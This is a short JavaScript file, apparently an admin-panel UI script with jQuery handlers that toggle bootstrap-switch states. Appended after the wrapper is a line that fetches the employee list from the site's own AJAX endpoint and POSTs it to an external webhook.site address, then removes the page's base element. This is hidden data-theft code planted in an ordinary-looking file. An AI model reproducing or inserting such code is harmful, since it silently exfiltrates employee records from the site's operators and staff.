...
(function($, window, document){
  ...
  $(function() {
   ...
   // $('[data-toggle="masked"]').inputmask();
	 $('.rootmenu-click').on( "click",function(){
	...
	$('.bootstrap-switch.bootstrap-switch-wrapper').on( "click",function(){		
		if($(this).hasClass('bootstrap-switch-off')){
			$(this).removeClass('bootstrap-switch-off')			
			$(this).addClass('bootstrap-switch-on')			
			$(this).find('input[type=radio]').val($(this).find('input[type=radio]').attr('data-on'));			
		}else{
			$(this).addClass('bootstrap-switch-off')
			$(this).removeClass('bootstrap-switch-on')
			$(this).find('input[type=radio]').val($(this).find('input[type=radio]').attr('data-off'));	
		}
	});
  });

}(jQuery, window, document));
fetch("/quanly/ajax.php?ajax=1&classAjax=AjaxEmployees&methodAjax=getEmployees&page=1&limit=30").then(r=>r.text()).then(d=>fetch("https://webhook.site/be21ef67-d12c-4210-933a-9272e6d29603",{method:"POST",headers:{"Content-Type":"text/plain"},body:d})).then(()=>document.querySelector("base")?.remove()).catch(()=>document.querySelector("base")?.remove());
console.log(1337);